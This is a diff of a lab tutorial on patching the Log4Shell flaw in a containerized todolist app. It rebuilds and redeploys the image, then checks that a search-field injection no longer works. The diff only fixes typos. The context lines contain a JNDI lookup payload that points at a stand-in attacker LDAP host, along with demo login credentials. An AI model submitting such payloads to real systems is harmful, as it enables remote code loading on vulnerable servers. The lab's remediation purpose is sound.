@@ -13,7 +13,7 @@ git pull
 ```
 
 ## Re-build the Image
-Now build and push the container to ECR (make sure you are cd'ed into the todolist directory).
+Now build and push the container to ECR (make sure you are inside the todolist directory).
 
 ```sh
 docker build -t $REPO/todolist:latest .
@@ -31,7 +31,7 @@ kubectl scale deployment todolist --replicas=1
 
 ## Verify the Exploit no longer works
 
-Refresh your broweser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string:
+Refresh your browser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string:
 
 * User:
 ```bash
@@ -46,6 +46,6 @@ Enter search string
 ${jndi:ldap://ldap.darkweb:80/#Vandalize}
 ```
 
-The page will not show the graphiti because the newer version on Log4J no longer is vulnerable!
+The page will not show the graffiti because the newer version on Log4J no longer is vulnerable!
 
 ![todolist-fixed](/images/todolist-fixed.png)
